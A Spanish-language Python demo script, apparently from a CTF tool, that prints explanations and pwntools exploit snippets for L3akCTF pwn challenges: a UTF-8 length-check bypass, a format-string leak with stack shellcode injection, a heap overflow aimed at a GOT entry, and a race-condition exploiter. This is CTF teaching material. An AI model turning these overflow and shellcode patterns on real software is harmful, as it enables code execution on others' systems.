#!/usr/bin/env python3
"""
Demostración Simplificada de Técnicas de MindCrafters
Muestra las técnicas específicas sin dependencias complejas
"""

import os
import sys
import time

def demo_utf8_bypass():
    """Demostración de técnica UTF-8 Bypass"""
    print("\n" + "="*60)
    print("🎯 TÉCNICA: UTF-8 BYTE BYPASS (Safe Gets Challenge)")
    print("="*60)
    
    print("📖 CONTEXTO:")
    print("   - Desafío: L3akCTF 2025 - Safe Gets")
    print("   - Problema: Buffer overflow más allá de 255 bytes")
    print("   - Limitación: Firewall Python permite máximo 255 caracteres")
    print("   - Solución: Explotar diferencia entre caracteres y bytes")
    
    print("\n🔍 ANÁLISIS:")
    print("   - Python cuenta caracteres, no bytes")
    print("   - Caracteres UTF-8 pueden ocupar múltiples bytes")
    print("   - Carácter 'ⓣ' = 3 bytes pero cuenta como 1 carácter")
    
    # Demostrar la técnica
    t_in_circle_utf8 = "ⓣ".encode("utf-8")
    print(f"\n💡 DEMOSTRACIÓN:")
    print(f"   - Carácter UTF-8 'ⓣ': {len(t_in_circle_utf8)} bytes")
    print(f"   - Hex representation: {t_in_circle_utf8.hex()}")
    
    # Construir payload
    utf8_chars = 30
    payload = t_in_circle_utf8 * utf8_chars
    payload += b'\x00' * 190
    payload += b'AAAAAAAA'  # Simular dirección de retorno
    
    print(f"\n🔧 PAYLOAD CONSTRUCTION:")
    print(f"   - UTF-8 chars: {utf8_chars} caracteres × 3 bytes = {utf8_chars * 3} bytes")
    print(f"   - Null padding: 190 bytes")
    print(f"   - Return address: 8 bytes")
    print(f"   - Total payload: {len(payload)} bytes")
    print(f"   - Character count: ~{utf8_chars} (bypass 255 limit)")
    
    print(f"\n✅ RESULTADO:")
    print(f"   - Payload size: {len(payload)} bytes > 255 byte limit")
    print(f"   - Character count: {utf8_chars} < 255 character limit")
    print(f"   - Bypass successful: ✓")
    
    print(f"\n💻 CÓDIGO DE EXPLOIT:")
    print("""
from pwn import *

# Carácter UTF-8 que ocupa 3 bytes pero cuenta como 1
t_in_circle_utf8 = "ⓣ".encode("utf-8")

# Construir payload que excede límite de bytes
payload = t_in_circle_utf8 * 30    # 90 bytes, 30 caracteres
payload += b'\\x00' * 190          # Padding
payload += p64(win_addr + 5)       # Return address

p.sendlineafter(b'Enter your input (max 255 bytes):', payload)
""")

def demo_format_string_exploit():
    """Demostración de Format String + Buffer Overflow"""
    print("\n" + "="*60)
    print("🎯 TÉCNICA: FORMAT STRING + BUFFER OVERFLOW (The Goose)")
    print("="*60)
    
    print("📖 CONTEXTO:")
    print("   - Desafío: L3akCTF 2025 - The Goose")
    print("   - Problema: Multi-stage challenge")
    print("   - Etapas: Guess number → Format string → Buffer overflow")
    print("   - Objetivo: Custom shellcode injection")
    
    print("\n🔍 ANÁLISIS MULTI-ETAPA:")
    
    # Etapa 1
    print("\n   ETAPA 1: Number Guessing")
    print("   - Overflow inicial para leak del número")
    print("   - Payload: 64 bytes de \\x01")
    print("   - Resultado: Leak del número de 'honks'")
    
    # Etapa 2  
    print("\n   ETAPA 2: Format String Leak")
    print("   - Vulnerable printf(name) sin format specifier")
    print("   - Payload: %1$p para leak de stack address")
    print("   - Resultado: Dirección del stack leakeada")
    
    # Etapa 3
    print("\n   ETAPA 3: Address Calculation")
    print("   - Calcular dirección donde inyectar shellcode")
    print("   - Formula: leaked_addr + 0x52 + 8")
    print("   - Resultado: Dirección precisa para shellcode")
    
    # Etapa 4
    print("\n   ETAPA 4: Buffer Overflow + Shellcode")
    print("   - Vulnerable gets() sin bounds checking")
    print("   - Payload: Buffer + RIP + Custom shellcode")
    print("   - Resultado: Code execution")
    
    # Simular el proceso
    print(f"\n💡 DEMOSTRACIÓN:")
    
    # Etapa 1
    overflow_payload = b'\x01' * 64
    leaked_number = 7  # Simulado
    print(f"   Etapa 1 - Overflow: {len(overflow_payload)} bytes → Number: {leaked_number}")
    
    # Etapa 2
    format_payload = "%1$p"
    leaked_addr = 0x7fffffffe000  # Simulado
    print(f"   Etapa 2 - Format: {format_payload} → Address: {hex(leaked_addr)}")
    
    # Etapa 3
    shellcode_addr = leaked_addr + 0x52 + 8
    print(f"   Etapa 3 - Calculation: {hex(leaked_addr)} + 0x5A → {hex(shellcode_addr)}")
    
    # Etapa 4
    shellcode_size = 25  # Tamaño típico de shellcode
    final_payload_size = 72 + 8 + shellcode_size
    print(f"   Etapa 4 - Final: 72 + 8 + {shellcode_size} = {final_payload_size} bytes")
    
    print(f"\n💻 CÓDIGO DE EXPLOIT:")
    print("""
from pwn import *

# Etapa 1: Leak número de honks
payload1 = 64 * b'\\x01'
p.sendlineafter(b'How shall we call you?', payload1)
digit = ord(p.recvn(1))

# Etapa 2: Format string leak
payload2 = f"%{1}$p".encode()
p.sendlineafter(b"what's your name again?", payload2)
leaked_addr = int(re.search(rb'0x[0-9a-fA-F]+', p.recv()).group(0), 16)

# Etapa 3: Calcular dirección de shellcode
shellcode_addr = leaked_addr + 0x52 + 8

# Etapa 4: Buffer overflow + shellcode
shellcode = asm(shellcraft.sh())
payload = b'A' * 72 + p64(shellcode_addr) + shellcode
p.sendline(payload)
""")

def demo_heap_feng_shui():
    """Demostración de Heap Feng Shui"""
    print("\n" + "="*60)
    print("🎯 TÉCNICA: HEAP FENG SHUI")
    print("="*60)
    
    print("📖 CONTEXTO:")
    print("   - Técnica: Manipulación controlada del heap layout")
    print("   - Objetivo: Crear condiciones específicas en el heap")
    print("   - Aplicación: Heap overflow, use-after-free, double-free")
    print("   - Resultado: Control de punteros y metadata")
    
    print("\n🔍 PROCESO DE FENG SHUI:")
    
    # Fase 1
    chunk_sizes = [0x20, 0x30, 0x40, 0x50, 0x60]
    print(f"\n   FASE 1: Preparar Layout")
    print(f"   - Allocar chunks: {[hex(s) for s in chunk_sizes]}")
    print(f"   - Crear patrón predecible en el heap")
    print(f"   - Resultado: Layout controlado")
    
    # Fase 2
    freed_chunks = [0, 2, 4]
    print(f"\n   FASE 2: Crear Fragmentación")
    print(f"   - Liberar chunks alternados: {freed_chunks}")
    print(f"   - Crear huecos específicos en el heap")
    print(f"   - Resultado: Fragmentación controlada")
    
    # Fase 3
    print(f"\n   FASE 3: Explotar Layout")
    print(f"   - Allocar chunk con tamaño específico")
    print(f"   - Overflow hacia chunk adyacente")
    print(f"   - Corromper metadata del heap")
    print(f"   - Resultado: Control de punteros")
    
    print(f"\n💡 DEMOSTRACIÓN:")
    
    # Simular allocaciones
    print("   Heap Layout Inicial:")
    for i, size in enumerate(chunk_sizes):
        print(f"     Chunk {i}: {hex(size)} bytes @ 0x{0x602000 + i*0x70:x}")
    
    # Simular liberaciones
    print(f"\n   Después de liberar chunks {freed_chunks}:")
    for i, size in enumerate(chunk_sizes):
        status = "FREE" if i in freed_chunks else "USED"
        print(f"     Chunk {i}: {hex(size)} bytes @ 0x{0x602000 + i*0x70:x} [{status}]")
    
    # Simular explotación
    exploit_size = 0x38
    print(f"\n   Explotación con chunk de {hex(exploit_size)} bytes:")
    print(f"     - Payload: 'A' * 0x18 + fake_size + target_addr")
    print(f"     - Fake size: 0x41 (bypass size checks)")
    print(f"     - Target: 0x602060 (GOT entry)")
    
    print(f"\n💻 CÓDIGO DE EXPLOIT:")
    print("""
# Fase 1: Preparar heap layout
chunk_sizes = [0x20, 0x30, 0x40, 0x50, 0x60]
for i, size in enumerate(chunk_sizes):
    alloc(i, size)

# Fase 2: Crear fragmentación controlada
for i in [0, 2, 4]:  # Liberar chunks alternados
    free(i)

# Fase 3: Explotar fragmentación
exploit_payload = b'A' * 0x18      # Padding
exploit_payload += p64(0x41)       # Fake chunk size
exploit_payload += p64(0x602060)   # Target address (GOT)

alloc(6, 0x38)  # Allocar en hueco específico
edit(6, exploit_payload)  # Overflow hacia chunk adyacente
""")

def demo_race_condition():
    """Demostración de Race Condition"""
    print("\n" + "="*60)
    print("🎯 TÉCNICA: ADVANCED RACE CONDITION")
    print("="*60)
    
    print("📖 CONTEXTO:")
    print("   - Problema: Condición de carrera en código multithreaded")
    print("   - Ventana: Timing crítico entre operaciones")
    print("   - Objetivo: Explotar estado inconsistente")
    print("   - Método: Múltiples threads con timing preciso")
    
    print("\n🔍 ANÁLISIS DE TIMING:")
    
    print(f"\n   CONFIGURACIÓN:")
    num_threads = 50
    base_delay = 0.0001
    print(f"   - Threads concurrentes: {num_threads}")
    print(f"   - Base delay: {base_delay}s")
    print(f"   - Stagger pattern: delay * thread_id")
    print(f"   - Race window: ~1ms")
    
    print(f"\n   TIMING PATTERN:")
    for i in range(5):
        delay = base_delay * i
        print(f"     Thread {i}: delay {delay:.4f}s")
    print("     ...")
    
    print(f"\n💡 DEMOSTRACIÓN:")
    
    # Simular condición de carrera
    print("   Simulación de Race Condition:")
    print("   - Global counter starts at 0")
    print("   - Target condition: counter == 500")
    print("   - Race window: between increment and check")
    
    # Mostrar ventana de explotación
    print(f"\n   Ventana de Explotación:")
    print("   Thread A: counter++ (499 → 500)")
    print("   Thread B: if (counter == 500) → FLAG!")
    print("   Thread A: counter++ (500 → 501)")
    print("   → Success if Thread B executes between A's operations")
    
    print(f"\n   Estrategia de Explotación:")
    print("   1. Lanzar múltiples threads simultáneamente")
    print("   2. Cada thread con timing ligeramente diferente")
    print("   3. Aumentar probabilidad de hit en race window")
    print("   4. Detectar condición exitosa automáticamente")
    
    print(f"\n💻 CÓDIGO DE EXPLOIT:")
    print("""
import threading
import time

class RaceExploiter:
    def __init__(self):
        self.success = False
        self.lock = threading.Lock()
    
    def worker_thread(self, thread_id):
        p = process(binary)
        
        # Timing crítico específico
        time.sleep(0.0001 * thread_id)
        
        # Payload para race condition
        payload = f"race_thread_{thread_id}".encode()
        p.sendline(payload)
        
        response = p.recvall(timeout=1)
        
        with self.lock:
            if b"flag" in response.lower():
                self.success = True
                print(f"Race won by thread {thread_id}!")

# Lanzar 50 threads concurrentes
exploiter = RaceExploiter()
threads = []

for i in range(50):
    t = threading.Thread(target=exploiter.worker_thread, args=(i,))
    threads.append(t)
    t.start()

for t in threads:
    t.join()
""")

def demo_integration_summary():
    """Resumen de integración con el sistema"""
    print("\n" + "="*60)
    print("🤖 INTEGRACIÓN CON PWN AI ANALYZER")
    print("="*60)
    
    print("📊 TÉCNICAS IMPLEMENTADAS:")
    techniques = [
        ("UTF-8 Byte Bypass", "Safe Gets Challenge", "✓ Implementado"),
        ("Format String + BOF", "The Goose Challenge", "✓ Implementado"),
        ("Heap Feng Shui", "Heap Challenges", "✓ Implementado"),
        ("Advanced Race Condition", "Threading Challenges", "✓ Implementado"),
        ("Stack Pivot ROP", "Advanced ROP", "✓ Implementado"),
        ("ret2dlresolve", "ASLR Bypass", "✓ Implementado"),
        ("SIGROP", "Signal ROP", "✓ Implementado")
    ]
    
    for technique, challenge_type, status in techniques:
        print(f"   - {technique:<25} | {challenge_type:<20} | {status}")
    
    print(f"\n🔍 DETECCIÓN AUTOMÁTICA:")
    detection_patterns = {
        "safe_gets_utf8": ["max", "255", "bytes", "character"],
        "the_goose_format": ["honk", "printf", "name", "guess"],
        "heap_challenge": ["malloc", "free", "chunk", "heap"],
        "race_condition": ["thread", "pthread", "concurrent", "race"]
    }
    
    for challenge_type, patterns in detection_patterns.items():
        print(f"   {challenge_type}:")
        print(f"     Patterns: {', '.join(patterns)}")
    
    print(f"\n🚀 FLUJO DE TRABAJO:")
    workflow_steps = [
        "1. Análisis automático del binario",
        "2. Detección de patrones específicos",
        "3. Clasificación del tipo de desafío",
        "4. Selección de técnica apropiada",
        "5. Generación de exploit personalizado",
        "6. Ejecución y validación"
    ]
    
    for step in workflow_steps:
        print(f"   {step}")
    
    print(f"\n💻 COMANDOS DE USO:")
    commands = [
        "python pwn_ai_analyzer.py ./challenge_dir/",
        "python advanced_pwn_solver.py ./binary",
        "python web_pwn_analyzer.py  # Interfaz web",
        "python demo_mindcrafters_simple.py  # Esta demo"
    ]
    
    for cmd in commands:
        print(f"   {cmd}")
    
    print(f"\n🎯 RESULTADOS ESPERADOS:")
    results = [
        "✓ Detección automática del tipo de desafío",
        "✓ Aplicación de técnica específica de MindCrafters",
        "✓ Generación de exploit funcional",
        "✓ Documentación detallada del proceso",
        "✓ Integración con IA para análisis avanzado"
    ]
    
    for result in results:
        print(f"   {result}")

def main():
    """Función principal de demostración"""
    print("🎯 MINDCRAFTERS TECHNIQUES - DEMOSTRACIÓN SIMPLIFICADA")
    print("="*60)
    print("Técnicas específicas extraídas de writeups reales de MindCrafters")
    print("Implementadas en nuestro sistema PWN AI Analyzer")
    
    while True:
        print("\n" + "="*50)
        print("MENÚ DE TÉCNICAS MINDCRAFTERS")
        print("="*50)
        print("1. UTF-8 Byte Bypass (Safe Gets)")
        print("2. Format String + Buffer Overflow (The Goose)")
        print("3. Heap Feng Shui")
        print("4. Advanced Race Condition")
        print("5. Resumen de Integración")
        print("6. Salir")
        
        choice = input("\nSelecciona una opción (1-6): ").strip()
        
        if choice == "1":
            demo_utf8_bypass()
        elif choice == "2":
            demo_format_string_exploit()
        elif choice == "3":
            demo_heap_feng_shui()
        elif choice == "4":
            demo_race_condition()
        elif choice == "5":
            demo_integration_summary()
        elif choice == "6":
            print("\n🎯 ¡Técnicas de MindCrafters implementadas exitosamente!")
            print("\n🚀 SISTEMA COMPLETO DISPONIBLE:")
            print("   - PWN AI Analyzer con técnicas de MindCrafters")
            print("   - Detección automática de tipos de desafíos")
            print("   - Generación de exploits específicos")
            print("   - Integración con IA para análisis avanzado")
            print("\n📚 PARA USAR EN DESAFÍOS REALES:")
            print("   python pwn_ai_analyzer.py <challenge_directory>")
            print("   python advanced_pwn_solver.py <binary_file>")
            print("   python web_pwn_analyzer.py  # Interfaz web")
            break
        else:
            print("[-] Opción inválida")
        
        input("\nPresiona Enter para continuar...")

if __name__ == "__main__":
    main()